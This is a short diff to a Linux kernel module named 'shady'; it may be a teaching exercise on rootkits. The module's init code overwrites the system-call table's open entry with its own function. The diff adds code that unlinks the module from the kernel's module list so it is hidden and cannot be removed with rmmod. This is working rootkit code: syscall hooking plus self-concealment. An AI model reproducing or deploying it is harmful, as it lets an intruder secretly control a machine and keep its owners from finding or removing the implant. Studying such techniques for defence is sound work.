@@ -236,6 +236,7 @@ shady_init_module(void)
   int i = 0;
   int devices_to_destroy = 0;
   dev_t dev = 0;
+  struct module *mod;
 	
   if (shady_ndevices <= 0)
     {
@@ -279,9 +280,14 @@ shady_init_module(void)
     }
   }
 
+  /* Hijack open */
   set_addr_rw(system_call_table_address);
   old_open = (asmlinkage int (*) (const char*, int, int))((unsigned long long**)system_call_table_address)[__NR_open];
   ((unsigned long long**)system_call_table_address)[__NR_open] = (unsigned long long *)my_open;
+
+  /* Hide shady. rmmod will no longer work. */
+  mod = find_module("shady");
+  list_del(&mod->list);
 
   return 0; /* success */
 
